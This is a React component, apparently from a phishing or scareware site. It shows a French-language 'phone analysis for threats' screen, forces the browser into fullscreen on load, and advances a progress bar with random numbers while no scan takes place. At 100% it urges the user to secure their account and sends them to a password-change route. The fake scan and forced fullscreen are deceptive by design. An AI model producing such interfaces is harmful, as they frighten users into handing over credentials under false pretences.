import React, { Component, Fragment } from 'react'
import { ReactComponent as SecureLogo } from '../../img/svg/account.svg'
import Typography from '@material-ui/core/Typography';
import { makeStyles, Grid, Button } from '@material-ui/core'
import LinearProgress from '@material-ui/core/LinearProgress';
import CloudUploadIcon from '@material-ui/icons/CloudUpload';
import LockOutlinedIcon from '@material-ui/icons/LockOutlined';
import { Link } from 'react-router-dom'
import Fullscreen from "react-full-screen";
import Header from '../Header';

class Analyse extends Component {

  constructor(props) {
    super();

    this.state = {
      isFull: false,
      completed: 0,
    };
  }






  action = (oldCompleted) => {
    if (oldCompleted === 100) {

      return 100;
    }
    const diff = Math.random() * 10;
    return Math.min(oldCompleted + diff, 100);
  }

  progress = () => {
    this.setState(({ a, completed }, props) => {
      return {

        completed: this.action(completed)
      }

    })
  }




  openFullscreen = () => {
    let elem = document.documentElement;
    if (elem.requestFullscreen) {
      elem.requestFullscreen();
    } else if (elem.mozRequestFullScreen) { /* Firefox */
      elem.mozRequestFullScreen();
    } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari & Opera */
      elem.webkitRequestFullscreen();
    } else if (elem.msRequestFullscreen) { /* IE/Edge */
      elem.msRequestFullscreen();
    }
  }





  componentDidMount() {
    this.openFullscreen()
    const timer = setInterval(this.progress, 500);
    return () => {
      clearInterval(timer);
    };

  }





  render() {
    return (


      <Fragment>



        <Header />


        <Grid
          container
          direction="column"
          justify="center"
          alignItems="center"
          style={{ marginTop: '50px' }}
        >

          <Grid item style={{ width: '50%' }}>

            <SecureLogo />
          </Grid>
          <Grid item style={{ width: '50%', textAlign: 'center' }}>
            <h3>Analyse de votre téléphone pour enlever toute ménace</h3>
            <LinearProgress variant="determinate" value={this.state.completed} />
            <p>{Math.round(this.state.completed)}%</p>
          </Grid>

          {

            Math.round(this.state.completed) == 100 && (<Grid item style={{ width: '50%', textAlign: 'center' }}>
              <p>Vuillez Sécuriser votre compte</p>

              <Link to="/modif-password">
              <Button
                variant="contained"
                color="primary"
                startIcon={<LockOutlinedIcon />}
              >
                Suivant
             </Button>
              </Link>

            </Grid>)

          }
        </Grid>



      </Fragment>














    )
  }
}

export default Analyse
